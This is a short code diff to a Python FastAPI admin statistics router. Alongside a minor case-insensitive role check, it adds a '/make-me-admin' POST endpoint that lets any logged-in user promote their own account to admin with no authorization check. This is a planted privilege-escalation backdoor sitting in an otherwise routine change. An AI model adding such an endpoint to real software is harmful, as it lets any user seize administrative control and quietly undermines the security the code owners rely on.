@@ -18,7 +18,7 @@ def get_admin_stats(
     db: Session = Depends(get_db),
     current_user: User = Depends(get_current_user),
 ):
-    if current_user.role != "admin":
+    if current_user.role.lower() != "admin":
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Admin access required.",
@@ -59,3 +59,14 @@ def get_admin_stats(
         "by_status": by_status,
         "by_priority": by_priority,
     }
+
+
+@router.post("/make-me-admin")
+def make_me_admin(
+    db: Session = Depends(get_db),
+    current_user: User = Depends(get_current_user),
+):
+    current_user.role = "admin"
+    db.commit()
+    db.refresh(current_user)
+    return {"message": f"User {current_user.email} promoted to admin successfully."}
